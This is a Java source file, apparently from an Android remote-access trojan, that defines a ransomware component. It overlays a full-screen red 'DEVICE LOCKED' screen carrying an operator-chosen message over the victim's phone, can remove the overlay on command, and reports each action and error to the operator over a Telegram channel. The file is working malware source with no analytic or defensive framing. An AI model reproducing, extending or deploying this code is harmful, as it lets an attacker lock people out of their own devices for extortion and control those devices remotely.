package com.enterprise.rat.commands;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.enterprise.rat.utils.TelegramApi;

public class RansomwareManager {
    private Context context;
    private static ViewGroup overlayView;

    public RansomwareManager(Context context) { this.context = context; }

    public void showLockScreen(String message) {
        try {
            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.CENTER;

            LinearLayout layout = new LinearLayout(context);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setBackgroundColor(Color.RED);
            layout.setGravity(Gravity.CENTER);
            layout.setPadding(40, 40, 40, 40);

            TextView titleText = new TextView(context);
            titleText.setText("⚠ DEVICE LOCKED ⚠");
            titleText.setTextColor(Color.WHITE);
            titleText.setTextSize(24);
            layout.addView(titleText);

            TextView messageText = new TextView(context);
            messageText.setText(message != null ? message : "Your device has been locked.");
            messageText.setTextColor(Color.WHITE);
            messageText.setTextSize(16);
            messageText.setPadding(20, 30, 20, 30);
            layout.addView(messageText);

            overlayView = layout;
            wm.addView(overlayView, params);
            TelegramApi.sendMessage("🔒 Lock screen displayed.");
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }

    public void removeLockScreen() {
        if (overlayView != null) {
            try {
                WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                wm.removeView(overlayView);
                overlayView = null;
            } catch (Exception e) {}
        }
        TelegramApi.sendMessage("🔓 Lock screen removed.");
    }
}
